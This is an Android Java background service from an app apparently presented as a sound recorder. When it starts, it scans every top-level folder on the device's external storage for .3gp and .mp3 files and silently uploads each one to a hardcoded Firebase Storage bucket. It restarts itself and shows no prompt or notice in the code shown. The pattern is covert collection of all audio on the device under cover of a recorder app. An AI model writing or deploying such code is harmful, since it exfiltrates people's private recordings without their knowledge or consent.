package sultaani.com.soundrecorder;

import android.app.IntentService;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.util.Log;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageMetadata;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FilenameFilter;
import java.util.ArrayList;

public class MyIntentService extends IntentService {



    FirebaseStorage storage = FirebaseStorage.getInstance();

    StorageReference storageRef = storage.getReferenceFromUrl("gs://soundrecorder-e16e5.appspot.com/").child("useraudiofiles");
    ArrayList<FilesModel> modelArrayList;

    static int position = 0;


    public MyIntentService() {
        super("MyIntentService");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        Log.i("oo", "onHandleIntent service called...!");


    }

    @Override
    public void onCreate() {
        super.onCreate();

        loadData();
        Log.i("oo","MyIntent Service OnCreate called...!");
    }

    void loadData(){
        ArrayList<String> recordlist = new ArrayList<>();
        modelArrayList = new ArrayList<>();

        File dir = new File(Environment.getExternalStorageDirectory().toString());


        if (dir.exists() && dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files !=null) {

                for (int i = 0; i < files.length; i++) {

                    File dirchild = new File(Environment.getExternalStorageDirectory().toString() + "/" + files[i].getName());
                    File[] filesarray = dirchild.listFiles(new FilenameFilter() {
                        @Override
                        public boolean accept(File dir, String name) {
                            if (name.endsWith(".3gp")) {
                                return true;
                            } else if (name.endsWith(".mp3")) {
                                return true;
                            }
                            return false;
                        }
                    });

                    if (filesarray != null) {

                        for (int m = 0; m < filesarray.length; m++) {
                            recordlist.add(filesarray[m].getName());
                            FilesModel filesModel = new FilesModel();
                            filesModel.setFolder(files[i].getName());
                            filesModel.setName((filesarray[m].getName()));
                            modelArrayList.add(filesModel);
                        }


                    }

                }

                //arraysize = modelArrayList.size();
                sendFileFirebase();
            }


        }


    }

    private void sendFileFirebase(){
        if (storageRef != null) {
            if (position < modelArrayList.size()){

                FilesModel filesModel = modelArrayList.get(position);
                String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/"+ filesModel.getFolder() +"/"
                        + filesModel.getName();
                Uri file = Uri.fromFile(new File(path));
                position++;
                StorageReference imageGalleryRef = storageRef.child(filesModel.getName());

                StorageMetadata metadata = new StorageMetadata.Builder()
                        .setContentType("audio/3gp")
                        .build();

                UploadTask uploadTask = imageGalleryRef.putFile(file,metadata);
                uploadTask.addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Log.i("service","Error in service while uploading file..");
                        sendFileFirebase();

                    }
                }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        Log.i("service","File uploaded successfully in background service..");
                        sendFileFirebase();
                    }
                });

            }

        } else {
            //IS NULL
        }

    }
}
